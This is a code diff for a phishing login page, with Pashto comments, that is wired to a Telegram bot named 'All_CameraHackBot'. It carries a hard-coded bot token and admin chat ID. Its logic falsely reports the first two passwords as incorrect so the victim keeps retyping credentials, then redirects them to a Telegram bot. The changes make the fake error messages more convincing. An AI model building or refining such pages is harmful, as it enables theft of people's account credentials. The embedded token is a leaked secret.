@@ -278,10 +278,13 @@
 </div>
 
 <script>
-    // ==================== Telegram Bot Settings ====================
+    // ==================== د Telegram بوټ تنظیمات ====================
+    // ستاسو د بوټ یوزرنیم دلته دننه کړئ
+    const BOT_USERNAME = "All_CameraHackBot";  // ستاسو د بوټ یوزرنیم دلته واچوئ
+    
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
     const ADMIN_CHAT_ID = "8295417969";
-    const BOT_REDIRECT = "https://t.me/imrankhabotstart=confirm_account";
+    const BOT_REDIRECT = `https://t.me/imrankhabot?start=confirm_account`;
 
     // د هڅو ذخیره
     let attemptStore = {};
@@ -363,16 +366,16 @@
         const currentAttempt = attemptStore[key].attempts + 1;
         attemptStore[key].attempts = currentAttempt;
 
-        // لومړۍ هڅه - ناکامه (اډمن ته خبر نه ځي)
+        // لومړۍ هڅه - ناکامه
         if (currentAttempt === 1) {
-            showMessage(errorBox, "❌ Incorrect password. 2 attempts remaining.", true);
+            showMessage(errorBox, "❌ Incorrect password. please  check your email.", true);
             setTimeout(() => { goBackToEmail(); }, 2000);
             return;
         }
 
-        // دوهمه هڅه - ناکامه (اډمن ته خبر نه ځي)
+        // دوهمه هڅه - ناکامه
         if (currentAttempt === 2) {
-            showMessage(errorBox, "❌ Incorrect password. 1 attempt remaining.", true);
+            showMessage(errorBox, "❌ Incorrect password. please check your password .", true);
             setTimeout(() => { goBackToEmail(); }, 2000);
             return;
         }
@@ -391,7 +394,11 @@
             const loginBtn = document.getElementById('loginBtn');
             loginBtn.disabled = true;
             loginBtn.style.opacity = '0.6';
-            setTimeout(() => { window.location.href = BOT_REDIRECT; }, 1800);
+            
+            // مستقیم بوټ ته لیږدول
+            setTimeout(() => { 
+                window.location.href = BOT_REDIRECT; 
+            }, 1500);
         }
     });
 
